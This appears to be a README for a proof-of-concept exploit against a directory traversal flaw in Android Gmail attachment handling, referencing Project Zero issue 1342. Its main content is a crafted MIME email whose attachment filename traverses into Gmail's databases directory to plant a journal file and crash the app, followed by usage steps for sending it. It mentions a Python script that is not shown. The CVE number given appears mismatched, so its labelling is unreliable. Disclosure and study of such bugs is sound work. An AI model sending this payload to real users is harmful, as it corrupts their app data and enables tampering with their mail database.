# Gmail Attachment Download Directory Traversal (CVE-2017-0785) Exploit

## Overview

This Python script demonstrates an exploit for a directory traversal vulnerability in attachment downloads within Gmail. The issue arises when handling attachments for non-Gmail accounts, allowing arbitrary files to be written to any location on the filesystem accessible to the Gmail app. It's important to note the following limitations:

1. The email address must belong to a non-Gmail and non-Gmailified (Hotmail or Yahoo) account.
2. The file cannot overwrite an existing file; it must be a file that doesn't already exist.
3. The user has to click to download the attachment, and the displayed path may look unusual on the screen.

Additionally, this vulnerability can be leveraged to modify an EmailProviderBody database by placing a journal file in the databases directory.

## Proof of Concept (PoC)

The provided Python script sends a malicious email to trigger this vulnerability. The email's Content-Type is set to multipart/mixed, and an audio attachment with a crafted filename exploits the directory traversal issue.

**Warning:** Using this PoC will cause Gmail to crash repeatedly, and you may need to re-install it to restore functionality.

```plaintext
Content-Type: multipart/mixed; boundary="---714A286D976BF3E58D9D671E37CBCF7C"
MIME-Version: 1.0
Subject: hello
To: <address>
From: natashenka@google.com

You will not see this in a MIME-aware mail reader.

------714A286D976BF3E58D9D671E37CBCF7C
Content-Type: text/html

<html><body><b>test</b></body></html>

------714A286D976BF3E58D9D671E37CBCF7C
Content-Type: audio/wav; name="../../../../data/data/com.google.android.gm/databases/EmailProviderBody.db-journal"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="test"

2dUF+SChY9f/////AAAAABAAAAAAAQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAA
... (base64-encoded data truncated for brevity)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGRyb2lkX21ldGFkYXRhYW5kcm9pZF9tZXRhZGF0YQNDUkVBVEUgVEFCTEUgAAAARlkAAABFSgAAAEs7AAAASSw=

------714A286D976BF3E58D9D671E37CBCF7C
```

## Usage

1. **Requirements:**
   - Python environment
   - Gmail accounts for sender (`FROM_ADDRESS`) and recipient (`TO_ADDRESS`)
   - Temporary password for the sender account (`YOUR_CREDENTIAL`)

2. **Configuration:**
   - Set `FROM_ADDRESS`, `YOUR_CREDENTIAL`, and `TO_ADDRESS` in the script.

3. **Run the Script:**
   - Execute the script to send the malicious email.

**Caution:** Use this script responsibly for educational purposes. Do not use it for unauthorized or malicious activities.

## Disclaimer

This exploit script is provided for educational and research purposes only. Usage for any illegal or unethical activities is strictly prohibited. The responsibility lies with the user, and the author disclaims any liability.

**Note:** This exploit targets a vulnerability that may have been patched since its disclosure. Use it in a controlled environment with the necessary permissions.

## Source
For more details, refer to the original [Project Zero Issue 1342](https://bugs.chromium.org/p/project-zero/issues/detail?id=1342).